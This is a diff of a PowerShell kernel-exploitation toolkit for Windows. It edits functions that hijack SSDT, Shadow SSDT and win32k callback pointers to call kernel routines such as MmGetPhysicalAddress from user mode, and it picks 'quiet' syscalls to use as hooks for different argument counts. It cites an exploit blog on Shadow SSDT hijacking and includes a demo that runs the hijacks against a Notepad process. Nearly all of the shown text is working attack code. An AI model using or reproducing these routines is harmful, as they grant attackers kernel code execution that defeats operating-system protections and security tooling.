@@ -237,7 +237,7 @@ Write-Host "---------------------------------" -ForegroundColor Gray
 # 1. Virtual to Physical Resolution
 $KernelVA = Get-KernelBaseAddress
 $Func     = "MmGetPhysicalAddress"
-$Values   = @($KernelVA, 0L, 0L)
+$Values   = @($KernelVA)
 
 # Format VA cleanly
 $FormattedVA = "0x{0:X}" -f [Int64]$KernelVA
@@ -253,11 +253,11 @@ try {
 } catch {}
 
 try {
-  $PA_NtCall   = Invoke-SsdtNtCallHijack $Func $Values
+  $PA_NtCall   = Invoke-SsdtNtCallHijack     $Func $Values
 } catch {}
 
 try {
-  $PA_Callback = Invoke-SsdtCallbackHijack $Func $Values
+  $PA_Callback = Invoke-SsdtCallbackHijack   $Func $Values
 } catch {}
 
 try {
@@ -303,7 +303,7 @@ $Color3  = if ($Result3 -eq 0) { "Green" } else { "Red" }
 Write-Host "Callback Hijack   -> Notepad (PID: $PROCID)"
 Write-Host "$(Get-StatusString $Result3)" -ForegroundColor $Color3
 
-Write-Host "---------------------------------" -ForegroundColor Gray
+Write-Host "---------------------------------"    -ForegroundColor Gray
 Write-Host "[+] All execution routines finished." -ForegroundColor Green
 #>
 
@@ -6680,23 +6680,29 @@ Function Invoke-SsdtCallbackHijack {
         [string]$ReturnMode = "Int64",
 
         [string]$Driver     = 'win32k.sys',
-        [string]$Target     = 'NtUserBuildHwndList',
+        [string]$Hook       = 'NtUserBuildHwndList',
         [Byte[]]$MovPattern = @(72, 139, 5),
         [Int32]$MovSize     = 7
     )
 
+    # ntuser.h
+    # https://github.com/DynamoRIO/drmemory/blob/master/wininc/ntuser.h
+
     $ParamCount = if ($Values -eq $null) { 0 } else { $Values.Length }
     switch ($ParamCount) {
-        0 { $Target = "NtUserGetForegroundWindow" }      # 0 args: Zero background noise, flawless fallback.
-        1 { $Target = "NtUserGetThreadState" }           # 1 arg:  Basic index lookup, no handle validation.
-        2 { $Target = "NtUserIsTopLevelWindow" }         # 2 args: Checks (HWND, HWND). If passing dummy pointers, just returns FALSE cleanly.
-        3 { $Target = "NtUserGetControlBrush" }          # 3 args: Safe internal GDI engine callback. Only fires if you query it.
-        4 { $Target = "NtUserWaitAvailableMessageLoop" } # 4 args: Thread messaging utility. Ignores bad arguments gracefully.
-        5 { $Target = "NtUserUpdateLayeredWindow" }      # 5 args: Bails out silently if structures are null/0 instead of throwing NTSTATUS errors.
-        6 { $Target = "NtUserTrackPopupMenuEx" }         # 6 args: Safe context menu handler. Returns 0 cleanly on bad inputs.
-        7 { $Target = "NtUserSetWindowPos" }             # 7 args: 4 are raw coordinate integers, exceptionally stable.
-        8 { $Target = "NtUserScrollWindowEx" }           # 8 args: UI scrolling framework. Remains dead quiet until triggered.
-        9 { $Target = "NtUserDrawCaptionTemp" }          # 9 args: Title rendering routine. Low priority validation.
+        0  { $Hook = "NtUserGetForegroundWindow"   }
+        1  { $Hook = "NtUserGetKeyboardState"      }
+        2  { $Hook = "NtUserGetKeyboardLayoutList" }
+        3  { $Hook = "NtUserGetControlBrush"       }
+        4  { $Hook = "NtUserGetControlColor"       }
+        5  { $Hook = "NtUserDrawMenuBarTemp"       }
+        6  { $Hook = "NtUserGetAltTabInfo"         }
+        7  { $Hook = "NtUserToUnicodeEx"           }
+        8  { $Hook = "NtUserSetWinEventHook"       }
+        9  { $Hook = "NtUserInitTask"              }
+		10 { $Hook = "NtUserInitTask"              }
+        11 { $Hook = "NtUserInitTask"              }
+        12 { $Hook = "NtUserInitTask"              }
         default {
             Write-Warning "No pre-configured quiet hook for $ParamCount parameters. Using: $Hook"
         }
@@ -6715,7 +6721,7 @@ Function Invoke-SsdtCallbackHijack {
 
     $DriverBase = Resolve-DriverAddress  -DriverName $Driver
     $TableRVA   = Resolve-SymbolFromFile -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
-    $StubRVA    = Resolve-SymbolFromFile -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
+    $StubRVA    = Resolve-SymbolFromFile -DllName $Driver -FunctionName "__win32kstub_$Hook" | Select -ExpandProperty RVA
 
     $TableVA    = [IntPtr]::Add($DriverBase, $TableRVA)
     $StubVA     = [IntPtr]::Add($DriverBase, $StubRVA)
@@ -6736,12 +6742,17 @@ Function Invoke-SsdtCallbackHijack {
 
     # Cache the execution block locally
     $AddressData    = Read-VirtualAddress -VA $RealAddress -BlockSize 64
+
+    if ($ParamCount -ge 9) {
+        [Byte[]]$MovPattern = @(76, 139, 21) 
+        [Int32]$MovSize     = 7
+    }
     $LiveVariableVA = Find-RipRelativeAddress -InstructionBaseVA $RealAddress -ByteBuffer $AddressData -OpcodePattern $MovPattern -InstructionSize $MovSize
 
     if ($null -eq $LiveVariableVA) {
         throw "Universal parser failed to match target instruction pattern."
     }
-
+    
     $CallbackVA = Read-VirtualAddress -VA $LiveVariableVA -AsLong
     $State      = Get-RecoveryState -RegPath "HKCU:\Software\StateRecoveryManager2"
     if ($State.RecoverFlag) {
@@ -6765,11 +6776,11 @@ Function Invoke-SsdtCallbackHijack {
         
         $Res = $null
         if ($ReturnMode -eq "Int64") {
-            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return int64 -Values $Values
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Hook -Return int64 -Values $Values
         } elseif ($ReturnMode -eq "Int32") {
-            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return int32 -Values $Values
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Hook -Return int32 -Values $Values
         } else {
-            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return byte -Values $Values
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Hook -Return byte -Values $Values
         }
         Set-RecoveryState -RegPath "HKCU:\Software\StateRecoveryManager2" -Status Succeed
         return $Res
@@ -6792,22 +6803,29 @@ Function Invoke-SsdtShadowCallHijack {
         [string]$Hook = "NtUserBuildHwndList"
     )
 
+    # ntuser.h
+    # https://github.com/DynamoRIO/drmemory/blob/master/wininc/ntuser.h
+
     $ParamCount = if ($Values -eq $null) { 0 } else { $Values.Length }
     switch ($ParamCount) {
-        0 { $Hook = "NtUserGetForegroundWindow" }    # 0 args: Zero background noise, flawless fallback.
-        1 { $Hook = "NtUserGetThreadState" }         # 1 arg:  Basic index lookup, no handle validation.
-        2 { $Hook = "NtUserIsTopLevelWindow" }       # 2 args: Checks (HWND, HWND). If passing dummy pointers, just returns FALSE cleanly.
-        3 { $Hook = "NtUserGetControlBrush" }        # 3 args: Safe internal GDI engine callback. Only fires if you query it.
-        4 { $Hook = "NtUserWaitAvailableMessageLoop" }# 4 args: Thread messaging utility. Ignores bad arguments gracefully.
-        5 { $Hook = "NtUserUpdateLayeredWindow" }    # 5 args: Bails out silently if structures are null/0 instead of throwing NTSTATUS errors.
-        6 { $Hook = "NtUserTrackPopupMenuEx" }       # 6 args: Safe context menu handler. Returns 0 cleanly on bad inputs.
-        7 { $Hook = "NtUserSetWindowPos" }           # 7 args: 4 are raw coordinate integers, exceptionally stable.
-        8 { $Hook = "NtUserScrollWindowEx" }         # 8 args: UI scrolling framework. Remains dead quiet until triggered.
-        9 { $Hook = "NtUserDrawCaptionTemp" }        # 9 args: Title rendering routine. Low priority validation.
+        0  { $Hook = "NtUserGetForegroundWindow"   }
+        1  { $Hook = "NtUserGetKeyboardState"      }
+        2  { $Hook = "NtUserGetKeyboardLayoutList" }
+        3  { $Hook = "NtUserGetControlBrush"       }
+        4  { $Hook = "NtUserGetControlColor"       }
+        5  { $Hook = "NtUserDrawMenuBarTemp"       }
+        6  { $Hook = "NtUserGetAltTabInfo"         }
+        7  { $Hook = "NtUserToUnicodeEx"           }
+        8  { $Hook = "NtUserSetWinEventHook"       }
+        9  { $Hook = "NtUserInitTask"              }
+		10 { $Hook = "NtUserInitTask"              }
+        11 { $Hook = "NtUserInitTask"              }
+        12 { $Hook = "NtUserInitTask"              }
         default {
             Write-Warning "No pre-configured quiet hook for $ParamCount parameters. Using: $Hook"
         }
     }
+       
 
     # Shadow SSDT Hijacking- Achieving Kernel Code Execution via Read-Write – Exploit Pack
     # https://www.exploitpack.com/blogs/news/shadow-ssdt-hijacking-to-achieve-kernel-code-execution-via-rw-primitives
@@ -6820,7 +6838,7 @@ Function Invoke-SsdtShadowCallHijack {
     }
 
     $Data    = Resolve-SymbolFromFile -DllName win32u.dll -FunctionName $Hook | select -ExpandProperty Bytes
-    $SysCall = [System.BitConverter]::ToInt32($Data,4)
+    $SysCall = [System.BitConverter]::ToInt32($Data, 4)
 
     $KerBase = Get-KernelBaseAddress
     $RVA     = Resolve-SymbolFromPdb -FunctionName KeServiceDescriptorTableShadow
@@ -6922,7 +6940,7 @@ Function Invoke-SsdtNtCallHijack {
         [object[]]$Values = $null,
         [ValidateSet("Int8", "Int32", "Int64")]
         [string]$ReturnMode = "Int64",
-        [string]$Hook = "NtSetLdtEntries"
+        [string]$Hook = "NtCreateProfile" # NtSetLdtEntries
     )
 
     # WinNotify: Building Kernel Read/Write from CR3-Based IOCTLs
